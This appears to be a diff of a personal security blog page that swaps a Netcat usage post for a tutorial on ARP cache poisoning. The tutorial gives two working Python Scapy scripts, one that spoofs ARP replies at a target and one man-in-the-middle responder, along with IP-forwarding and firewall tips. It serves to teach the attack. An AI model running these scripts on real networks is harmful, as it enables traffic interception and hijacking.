@@ -3,28 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Netcat | &lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~</title>
+  <title>ARP cache Poisoning | &lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="BriefThe Swiss Army Knife of TCP/IP Connections   As the man page notes, the Netcat tool is known as the Swiss Army knife for TCP/IP connections. It’s a versatile tool.
-Usage1root@kali:~#nc -h
-
-Check">
+  <meta name="description" content="What is ARP cache Poisoning?In computer networking, Arp spoofing,ARP cache poison routing, is a techniqueby which an attacker sends (spoofed) Address Resolution Protocol(ARP) messagesonto a local area">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Netcat">
-<meta property="og:url" content="http://0daybug.github.io/2016/04/06/Netcat/index.html">
+<meta property="og:title" content="ARP cache Poisoning">
+<meta property="og:url" content="http://0daybug.github.io/2016/06/09/ARP-cache-Poisoning/index.html">
 <meta property="og:site_name" content="<(￣ c￣)y▂ξ 真煩,來哈根草吧~">
-<meta property="og:description" content="BriefThe Swiss Army Knife of TCP/IP Connections   As the man page notes, the Netcat tool is known as the Swiss Army knife for TCP/IP connections. It’s a versatile tool.
-Usage1root@kali:~#nc -h
-
-Check">
-<meta property="og:image" content="http://7xs1w6.com1.z0.glb.clouddn.com/netcat.png">
-<meta property="og:updated_time" content="2016-04-06T10:58:50.000Z">
+<meta property="og:description" content="What is ARP cache Poisoning?In computer networking, Arp spoofing,ARP cache poison routing, is a techniqueby which an attacker sends (spoofed) Address Resolution Protocol(ARP) messagesonto a local area">
+<meta property="og:updated_time" content="2016-06-09T12:16:22.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Netcat">
-<meta name="twitter:description" content="BriefThe Swiss Army Knife of TCP/IP Connections   As the man page notes, the Netcat tool is known as the Swiss Army knife for TCP/IP connections. It’s a versatile tool.
-Usage1root@kali:~#nc -h
-
-Check">
+<meta name="twitter:title" content="ARP cache Poisoning">
+<meta name="twitter:description" content="What is ARP cache Poisoning?In computer networking, Arp spoofing,ARP cache poison routing, is a techniqueby which an attacker sends (spoofed) Address Resolution Protocol(ARP) messagesonto a local area">
   
     <link rel="alternative" href="/atom.xml" title="&lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~" type="application/atom+xml">
   
@@ -226,11 +216,11 @@ Check">
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-Netcat" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ARP-cache-Poisoning" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/04/06/Netcat/" class="article-date">
-      <time datetime="2016-04-06T10:43:26.000Z" itemprop="datePublished">2016-04-06</time>
+      <a href="/2016/06/09/ARP-cache-Poisoning/" class="article-date">
+      <time datetime="2016-06-09T11:42:39.000Z" itemprop="datePublished">2016-06-09</time>
 </a>
     </div>
   
@@ -243,7 +233,7 @@ Check">
         
   
     <h1 class="article-title" itemprop="name">
-      Netcat
+      ARP cache Poisoning
     </h1>
   
 
@@ -254,7 +244,7 @@ Check">
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Penetration-Testing/">Penetration Testing</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -264,12 +254,36 @@ Check">
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="Brief"><a href="#Brief" class="headerlink" title="Brief"></a>Brief</h3><h2 id="The-Swiss-Army-Knife-of-TCP-IP-Connections"><a href="#The-Swiss-Army-Knife-of-TCP-IP-Connections" class="headerlink" title="The Swiss Army Knife of TCP/IP Connections"></a>The Swiss Army Knife of TCP/IP Connections</h2><p>   As the man page notes, the Netcat tool is known as the Swiss Army knife<br> for TCP/IP connections. It’s a versatile tool.</p>
-<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment">#nc -h</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://7xs1w6.com1.z0.glb.clouddn.com/netcat.png" alt=""></p>
-<h3 id="Check-to-see-if-a-port-is-listening"><a href="#Check-to-see-if-a-port-is-listening" class="headerlink" title="Check to see if a port is listening"></a>Check to see if a port is listening</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment">#nc -v [target ip address] [port]</span></span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">nc -v <span class="number">192.168</span>.<span class="number">130.133</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>
-<p>You can also use the following command:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment">#nc -lvp 1234</span></span><br><span class="line">listening on [any] <span class="number">1234</span>....</span><br></pre></td></tr></table></figure></p>
-<p>You use the options l for listen, v for verbose,and p to spcify the port to listen on</p>
+        <h2 id="What-is-ARP-cache-Poisoning"><a href="#What-is-ARP-cache-Poisoning" class="headerlink" title="What is ARP cache Poisoning?"></a>What is ARP cache Poisoning?</h2><p>In computer networking, Arp spoofing,ARP cache poison routing, is a technique<br>by which an attacker sends (spoofed) Address Resolution Protocol(ARP) messages<br>onto a local area network.Generally, the aim is to associate the attacker’s<br>MAC address with the IP address of another host, such as the default gateway,<br>causing any traffic meant for that IP address to be sent to the attacker instead.</p>
+<p>Arp spoofing may allow an attacker to intercept data frames on a network, modify<br>the traffic, or stop all traffic. Often the attack is used as an opening for other<br>attacks, such as denial of service, man in the middle, or session hijacking attacks.</p>
+<p>The attack can only be used on networks that use the address resolution protocol,<br>and is limited to local network segments.</p>
+<h2 id="How-to-create-an-attack-using-Scapy"><a href="#How-to-create-an-attack-using-Scapy" class="headerlink" title="How to create an attack using Scapy?"></a>How to create an attack using Scapy?</h2><p>code Part:</p>
+<p>import sys<br>import time<br>from scapy.all import sendp, ARP, Ether</p>
+<p>if len(sys.argv) &lt; 3:<br>    print sys.argv[0] + “: ,<target> <spoof_ip>“<br>        sys.exit(1)</spoof_ip></target></p>
+<p>iface = “eth0”<br>target_ip = sys.argv[1]<br>fake_ip = sys.argv[2]</p>
+<p>ethernet = Ether()<br>arp = ARP(pdst = target_ip, psrc = fake_ip, op=”is-at”)<br>packet = ethernet / arp</p>
+<p>while True:<br>    sendp(packet, iface=iface)<br>    time.sleep(10)</p>
+<h2 id="How-did-it-work"><a href="#How-did-it-work" class="headerlink" title="How did it work?"></a>How did it work?</h2><p>With the help of Scapy we construct a packet called packet consisting of an<br>Ether() and an ARP() header. In the ARP header we set the IP address of the<br>victim (target_ip) and the IP which we would like to hijack all connections<br>(fake_ip). As last parameter we define the OP-Code is-at, that declares the<br>packet as an ARP response.Afterwads the function sendp() and not the function<br>send(), because the packet should be sent on layer 2.The function send() sends<br>packets on layer 3.</p>
+<p>One last thing to remember to enable IP forwarding otherwise your host would<br>block the connection of the victim.</p>
+<p>sysctl net.ipv4.ip_forward=1</p>
+<p>Don’t forget to check the settings of your packet filter like IPtables, pf or<br>ipfw or just disable it.</p>
+<h2 id="Man-in-the-middle"><a href="#Man-in-the-middle" class="headerlink" title="Man in the middle"></a>Man in the middle</h2><p>A computer that wants to get knowledge about an IP address asks with an ARP<br>request. I write the program that waits for ARP requests and sends a spoofed in<br>every received request. In a switched environment this will result in every<br>connection flowing over the computer of the attacker, because in every ARP cache<br>there will be the MAC for every IP address. This solution is more elegant and<br>not as noisy as the one before, but still quite easy to detected for a trained admin</p>
+<p>Code Part:</p>
+<p>import sys<br>from scapy.all import sniff, sendp, ARP, Ether</p>
+<p>if len(sys.argv) &lt; 2:<br>    print sys.argv[0] + “ <iface>“<br>    sys.exit(0)</iface></p>
+<p>def arp_poison_callback(packet):</p>
+<pre><code>#Got ARP request?
+if packet[ARP].op == 1:
+    answer = Ether(dst=packet[ARP].hwsrc) / ARP()
+    answer[ARP].op = &quot;is-at&quot;
+    answer[ARP].hwdst = packet[ARP].hwsrc
+    answer[ARP].psrc = packet[ARP].pdst
+    answer[ARP].pdst = packet[ARP].psrc
+
+    print &quot;Fooling &quot; + packet[ARP].psrc + &quot; that &quot; + \
+            packet[ARP].pdst + &quot; is me&quot;
+    sendp(answer, iface=sys.argv[1])
+</code></pre><p>sniff(prn=arp_poison_callback,<br>      filter=”arp”,<br>      iface=sys.argv[1],<br>      store=0<br>    )</p>
 
       
     </div>
@@ -278,13 +292,13 @@ Check">
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/04/06/Netcat/">Netcat</a></p>
+        <p><span>本文标题:</span><a href="/2016/06/09/ARP-cache-Poisoning/">ARP cache Poisoning</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Dylan Kios 的个人博客">Dylan Kios</a></p>
-        <p><span>发布时间:</span>2016年04月06日 - 18时43分</p>
-        <p><span>最后更新:</span>2016年04月06日 - 18时58分</p>
+        <p><span>发布时间:</span>2016年06月09日 - 19时42分</p>
+        <p><span>最后更新:</span>2016年06月09日 - 20时16分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/04/06/Netcat/" title="Netcat">http://0daybug.github.io/2016/04/06/Netcat/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://0daybug.github.io/2016/04/06/Netcat/　　作者: Dylan Kios" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2016/06/09/ARP-cache-Poisoning/" title="ARP cache Poisoning">http://0daybug.github.io/2016/06/09/ARP-cache-Poisoning/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0daybug.github.io/2016/06/09/ARP-cache-Poisoning/　　作者: Dylan Kios" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -297,16 +311,10 @@ Check">
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2016/04/12/MS08-067/">
-                    MS08-067
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2016/04/05/Kali-Linux-source-file-and-install-vsftpd/">
-                    Kali Linux source file and install vsftpd
+                <a href="/2016/06/09/Socket/">
+                    Socket
                 </a>
             </div>
         
@@ -317,7 +325,7 @@ Check">
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Brief"><span class="toc-number">1.</span> <span class="toc-text">Brief</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Swiss-Army-Knife-of-TCP-IP-Connections"><span class="toc-number"></span> <span class="toc-text">The Swiss Army Knife of TCP/IP Connections</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Usage"><span class="toc-number">1.</span> <span class="toc-text">Usage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Check-to-see-if-a-port-is-listening"><span class="toc-number">2.</span> <span class="toc-text">Check to see if a port is listening</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-ARP-cache-Poisoning"><span class="toc-number">1.</span> <span class="toc-text">What is ARP cache Poisoning?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-create-an-attack-using-Scapy"><span class="toc-number">2.</span> <span class="toc-text">How to create an attack using Scapy?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-did-it-work"><span class="toc-number">3.</span> <span class="toc-text">How did it work?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Man-in-the-middle"><span class="toc-number">4.</span> <span class="toc-text">Man in the middle</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -381,7 +389,7 @@ Check">
   
   <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="Netcat" data-title="Netcat" data-url="http://0daybug.github.io/2016/04/06/Netcat/"></div>
+    <div class="ds-thread" data-thread-key="ARP-cache-Poisoning" data-title="ARP cache Poisoning" data-url="http://0daybug.github.io/2016/06/09/ARP-cache-Poisoning/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -405,15 +413,13 @@ Check">
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/04/12/MS08-067/" title="上一篇: MS08-067">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2016/04/05/Kali-Linux-source-file-and-install-vsftpd/" title="下一篇: Kali Linux source file and install vsftpd">
+            <a href="/2016/06/09/Socket/" title="下一篇: Socket">
                 <i class="fa fa-angle-right"></i>
             </a>
         
